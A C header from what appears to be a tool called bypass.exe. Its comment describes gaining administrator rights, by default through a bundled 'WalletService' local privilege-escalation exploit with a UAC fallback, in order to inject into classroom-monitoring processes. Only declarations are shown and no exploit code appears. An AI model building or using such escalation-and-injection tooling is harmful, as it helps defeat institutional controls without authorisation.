/*
 * elevate.h -- start-up elevation with a graceful fallback.
 *
 * The tool needs Administrator rights (driver IOCTL + injecting into the
 * classroom processes).  The mode is decided by the code - LPE when
 * bin\lpe\trigger.ps1 exists, otherwise the UAC prompt - and can be forced
 * with --elevate=... on the command line:
 *
 *   uac      ShellExecuteEx("runas"): the classic UAC prompt.  Default when
 *            the LPE payload is not installed.
 *   lpe      Try the WalletService LPE shipped in bin\lpe\ first.  If that
 *            does not produce an elevated instance in time, fall back to the
 *            UAC prompt and finally to the manual instructions.  Default when
 *            bin\lpe\trigger.ps1 exists.
 *   manual   Never start anything by itself: instruct the user to right-click
 *            bypass.exe -> "Run as administrator" (a Retry button still fires
 *            the UAC prompt).
 *   off      No elevation handling at all (debugging only).
 *
 * Pure ASCII.
 */
#ifndef BYPASS_ELEVATE_H
#define BYPASS_ELEVATE_H

#define ELEVATE_UAC     0
#define ELEVATE_LPE     1
#define ELEVATE_MANUAL  2
#define ELEVATE_OFF     3

/* 1 = this process is already elevated (member of BUILTIN\Administrators) */
int  Elevate_IsAdmin(void);

/* 1 = the command line marks this instance as spawned by the elevation chain
   (the broker appends --elevate=uac).  Chain members must not truncate the
   shared bypass_hook.log and report a final failure to the launcher. */
int  Elevate_IsSpawnedChildCmd(const char* cmdline);

/* Called by the unelevated instance from WinMain().
 *   1 = an elevated instance was started -> exit the current one
 *   0 = nothing was started (a dialog/message has already been shown) -> exit
 * `cmdline` is the raw command line to forward, `silent` suppresses all UI. */
int  Elevate_Boot(HWND owner, const char* cmdline, int silent);

/* Called by the elevated instance as soon as it knows it is admin: writes the
 * "elevated instance pid=..." line to the shared log, which is what the
 * launcher waits for. */
void Elevate_NoteElevated(void);

#endif
